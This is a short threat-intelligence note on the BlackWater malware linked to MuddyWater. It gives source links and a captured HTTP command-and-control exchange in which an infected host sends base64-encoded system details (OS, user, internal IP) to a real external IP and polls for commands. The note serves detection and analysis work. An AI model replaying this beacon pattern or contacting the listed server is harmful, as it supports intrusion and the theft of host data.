# Blackwater and Muddywater

#Links:
https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html?m=1
https://github.com/xtr4nge/FruityC2/blob/master/agent/ps_agent.ps1
https://app.any.run/tasks/3b2c90d1-415f-4c4a-a050-eae298862da1/

# Protocols:
HTTP

# Ports:
80

# Sample:

```
POST /serverScript/clientFrontLine/helloServer.php?helloMsg=NEEtNkEtQjMtN0EtODgtQjQtMEYtNjQtRkYtNjYtQzctOTYtNzctM0UtMzUtRDUqNDAzMzQwMzMq%0D%0Ac2NydEFnbnQxLjEqTWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwqMzItYml0KlVTRVIt%0D%0AUEMqV09SS0dST1VQKlVTRVItUENcYWRtaW4qMTkyLjE2OC4xMDAuMTE0 HTTP/1.1
Host: 94.23.148.194
Content-Length: 8
Expect: 100-continue
Connection: Keep-Alive

HTTP/1.1 100 Continue

helloMsgHTTP/1.1 200 OK
Date: Wed, 10 Apr 2019 15:14:25 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

4
%HI%
0

POST /serverScript/clientFrontLine/getCommand.php?clientIdentity=NEEtNkEtQjMtN0EtODgtQjQtMEYtNjQtRkYtNjYtQzctOTYtNzctM0UtMzUtRDU= HTTP/1.1
Host: 94.23.148.194
Content-Length: 14
Expect: 100-continue

HTTP/1.1 100 Continue

clientIdentityHTTP/1.1 200 OK
Date: Wed, 10 Apr 2019 15:16:19 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

4
U0hI
0
```
